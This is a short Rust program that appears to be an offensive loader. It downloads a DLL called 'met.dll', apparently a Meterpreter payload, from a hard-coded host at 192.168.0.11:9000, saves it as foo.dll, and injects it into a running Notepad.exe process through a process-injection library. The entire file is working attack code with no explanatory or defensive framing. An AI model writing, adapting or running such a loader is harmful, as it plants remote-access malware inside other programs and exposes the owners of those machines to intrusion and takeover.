use process_injection::*;
use reqwest::{self, Error};
use std::fs::File;
use std::io::Write;
use std::path::Path;
use windows_sys::Win32::Foundation::CloseHandle;

#[tokio::main]
async fn main() -> Result<(), Error> {
    let url = "http://192.168.0.11:9000/met.dll";
    let mut response = reqwest::get(url).await?;
    let path = Path::new("./foo.dll");
    let mut tmp_file = File::create(path).expect("Couldn't open file");
    while let Some(chunk) = response.chunk().await? {
        if let Err(e) = tmp_file.write(&chunk) {
            println!("Couldn't write to file: {:?}", e);
            return Ok(());
        }
    }
    let tmp_file = std::fs::canonicalize(path).expect("Couldn't canonicalize file path.");
    let process_name = "Notepad.exe".to_string();
    match inject_dll(process_name, tmp_file.to_str().unwrap()) {
        Ok(h) => println!("Process has been injected: {}", unsafe { CloseHandle(h) }),
        Err(e) => println!("Error during injection: {:?}", e),
    }
    Ok(())
}
